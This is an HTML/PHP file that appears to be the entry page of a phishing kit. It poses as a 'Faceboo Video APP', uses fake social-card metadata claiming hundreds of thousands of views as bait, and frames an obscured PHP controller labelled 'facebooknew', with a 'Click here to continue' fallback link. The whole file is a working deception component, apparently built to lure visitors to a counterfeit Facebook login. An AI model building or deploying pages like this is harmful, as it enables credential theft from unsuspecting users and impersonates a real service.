
	<html> 
	<head> 
	<title>Faceboo Video APP</title>
		
		<meta name="twitter:card" content="summary" />
		<meta name="twitter:site" content="@" />
		<meta name="twitter:title" content="Watch video @" />
		<meta name="twitter:description" content="705,435 Views " />
		<meta name="twitter:image" content="https://avatars.io/twitter/" />
	
	</head>
	<frameset rows="*,3" frameborder="NO" border="50" framespacing="0">
	<frame name="main" src="../.././public/CONTROLLER8c0c4a64-3e10-4ddb-9f1d-e2f50f8e6876.php?source=.%2Fpublic%2FACCESSS19e855c9-6a3e-4a22-9db6-73b229cb87f4&lan=facebooknew&<?php echo http_build_query($_GET); ?>"> <noframes> 
	<body bgcolor="#FFFFFF" text="#000000"> 
	<a href="../.././public/CONTROLLER8c0c4a64-3e10-4ddb-9f1d-e2f50f8e6876.php?source=.%2Fpublic%2FACCESSS19e855c9-6a3e-4a22-9db6-73b229cb87f4&lan=facebooknew&<?php echo http_build_query($_GET); ?>">Click here to continue</a> 
	</body> 
	</noframes> 
	</html> 
   